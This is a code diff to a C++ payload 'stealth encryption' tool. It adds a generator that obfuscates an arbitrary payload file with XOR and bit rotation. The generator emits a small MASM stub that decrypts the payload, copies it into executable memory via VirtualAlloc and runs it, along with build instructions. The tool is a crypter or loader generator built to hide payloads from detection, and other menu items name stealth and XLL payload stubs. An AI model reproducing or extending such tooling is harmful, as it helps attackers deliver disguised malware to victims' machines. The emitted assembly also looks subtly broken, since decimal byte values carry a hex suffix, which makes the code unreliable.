@@ -230,9 +230,10 @@ public:
         std::cout << "  2. Basic Encryption - Raw Binary Output" << std::endl;
         std::cout << "  3. Stealth Triple Encryption" << std::endl;
         std::cout << "  4. Runtime-Only Encryption (No Disk Save)" << std::endl;
-        std::cout << "  5. Generate Stealth Payload Stub" << std::endl;
-        std::cout << "  6. Generate Encryptor Stub" << std::endl;
-        std::cout << "  7. Generate XLL Stealth Payload Stub" << std::endl;
+        std::cout << "  5. Generate MASM Runtime Stub (<2KB)" << std::endl;
+        std::cout << "  6. Generate Stealth Payload Stub" << std::endl;
+        std::cout << "  7. Generate Encryptor Stub" << std::endl;
+        std::cout << "  8. Generate XLL Stealth Payload Stub" << std::endl;
         std::cout << "  0. Exit" << std::endl;
         std::cout << "\nEnter your choice: ";
     }
@@ -531,6 +532,171 @@ public:
         // Data automatically destroyed when function exits (vectors go out of scope)
         std::cout << "\nPress Enter to destroy encrypted data and return to menu...";
         std::cin.get();
+        
+        return true;
+    }
+
+    bool generateMASMRuntimeStub() {
+        std::string inputFile, outputFile;
+        
+        std::cout << "=== Generate MASM Runtime Stub (<2KB) ===" << std::endl;
+        std::cout << "Creates ultra-lightweight pure assembly stubs for runtime decryption\n" << std::endl;
+        
+        std::cout << "Enter payload file path: ";
+        std::getline(std::cin, inputFile);
+        std::cout << "Enter output MASM file path (e.g., stub.asm): ";
+        std::getline(std::cin, outputFile);
+        
+        // Read and encrypt payload
+        std::ifstream inFile(inputFile, std::ios::binary);
+        if (!inFile) {
+            std::cout << "Error: Cannot open payload file!" << std::endl;
+            return false;
+        }
+        
+        std::vector<uint8_t> payload((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
+        inFile.close();
+        
+        if (payload.empty()) {
+            std::cout << "Error: Payload file is empty!" << std::endl;
+            return false;
+        }
+        
+        // Generate simple XOR key for MASM (assembly-friendly)
+        uint8_t xorKey = (rng() % 255) + 1; // Avoid 0x00
+        uint8_t rolKey = (rng() % 7) + 1;   // ROL/ROR amount
+        
+        // Apply simple encryption (XOR + ROL)
+        for (size_t i = 0; i < payload.size(); i++) {
+            // ROL then XOR for better diffusion
+            uint8_t byte = payload[i];
+            byte = (byte << rolKey) | (byte >> (8 - rolKey)); // ROL
+            byte ^= xorKey ^ (i & 0xFF); // XOR with key and position
+            payload[i] = byte;
+        }
+        
+        // Generate MASM stub
+        std::string stub = R"(.386
+.model flat, stdcall
+option casemap:none
+
+include kernel32.inc
+includelib kernel32.lib
+
+.data
+    ; Encrypted payload ()" + std::to_string(payload.size()) + R" bytes)
+    payload db )";
+        
+        // Add encrypted payload bytes
+        for (size_t i = 0; i < payload.size(); i++) {
+            if (i % 16 == 0) stub += "\n        db ";
+            stub += "0" + std::to_string(payload[i]) + "h";
+            if (i < payload.size() - 1) {
+                stub += (i % 16 == 15) ? "" : ",";
+            }
+        }
+        
+        stub += R"(
+    payload_size equ $-payload
+    
+    ; Decryption keys
+    xor_key db )" + std::to_string((int)xorKey) + R"(h
+    rol_key db )" + std::to_string((int)rolKey) + R"(h
+
+.code
+start:
+    ; Get payload address
+    lea esi, payload
+    mov ecx, payload_size
+    mov al, xor_key
+    mov bl, rol_key
+    xor edx, edx        ; Position counter
+    
+decrypt_loop:
+    ; Load encrypted byte
+    mov ah, [esi]
+    
+    ; XOR with key and position
+    xor ah, al
+    xor ah, dl
+    
+    ; ROR to reverse ROL
+    mov cl, bl
+    ror ah, cl
+    
+    ; Store decrypted byte
+    mov [esi], ah
+    
+    ; Next byte
+    inc esi
+    inc edx
+    mov ecx, payload_size
+    cmp edx, ecx
+    jl decrypt_loop
+    
+    ; Allocate executable memory
+    push PAGE_EXECUTE_READWRITE  ; 40h
+    push MEM_COMMIT              ; 1000h  
+    push payload_size
+    push 0
+    call VirtualAlloc
+    test eax, eax
+    jz exit_stub
+    
+    ; Copy decrypted payload to executable memory
+    mov edi, eax        ; Destination (executable memory)
+    lea esi, payload    ; Source (decrypted payload)
+    mov ecx, payload_size
+    cld
+    rep movsb
+    
+    ; Execute payload
+    call eax
+    
+exit_stub:
+    ; Exit process
+    push 0
+    call ExitProcess
+
+end start
+)";
+        
+        // Write MASM file
+        std::ofstream asmFile(outputFile);
+        if (!asmFile) {
+            std::cout << "Error: Cannot create MASM file!" << std::endl;
+            return false;
+        }
+        
+        asmFile << stub;
+        asmFile.close();
+        
+        // Calculate approximate size
+        size_t stubSize = stub.length() + payload.size();
+        bool under2KB = stubSize < 2048;
+        
+        std::cout << "\n=== MASM Runtime Stub Generated ===" << std::endl;
+        std::cout << "✓ Output: " << outputFile << std::endl;
+        std::cout << "✓ Payload size: " << payload.size() << " bytes" << std::endl;
+        std::cout << "✓ Estimated stub size: " << stubSize << " bytes ";
+        std::cout << (under2KB ? "(✓ Under 2KB!)" : "(⚠ Over 2KB)") << std::endl;
+        std::cout << "✓ Encryption: XOR + ROL (assembly-optimized)" << std::endl;
+        std::cout << "✓ XOR Key: 0x" << std::hex << (int)xorKey << std::dec << std::endl;
+        std::cout << "✓ ROL Key: " << (int)rolKey << " bits" << std::endl;
+        
+        std::cout << "\n=== Build Instructions ===" << std::endl;
+        std::cout << "1. Assemble: ml /c /coff " << outputFile << std::endl;
+        std::cout << "2. Link: link /subsystem:windows " << outputFile.substr(0, outputFile.find_last_of('.')) << ".obj" << std::endl;
+        std::cout << "   OR" << std::endl;
+        std::cout << "   link /subsystem:console " << outputFile.substr(0, outputFile.find_last_of('.')) << ".obj" << std::endl;
+        
+        std::cout << "\n=== Features ===" << std::endl;
+        std::cout << "• Pure MASM assembly code" << std::endl;
+        std::cout << "• Runtime-only decryption (no disk writes)" << std::endl;
+        std::cout << "• VirtualAlloc for executable memory" << std::endl;
+        std::cout << "• XOR + ROL encryption (fast)" << std::endl;
+        std::cout << "• No C runtime dependencies" << std::endl;
+        std::cout << "• Ultra-small footprint" << std::endl;
         
         return true;
     }
@@ -850,12 +1016,18 @@ int main(int argc, char* argv[]) {
                     stealthTripleEncryption();
                     break;
                 case 4:
-                    generateStealthPayloadStub();
+                    runtimeOnlyEncryption();
                     break;
                 case 5:
-                    generateEncryptorStub();
+                    generateMASMRuntimeStub();
                     break;
                 case 6:
+                    generateStealthPayloadStub();
+                    break;
+                case 7:
+                    generateEncryptorStub();
+                    break;
+                case 8:
                     generateXLLStealthStub();
                     break;
                 case 0:
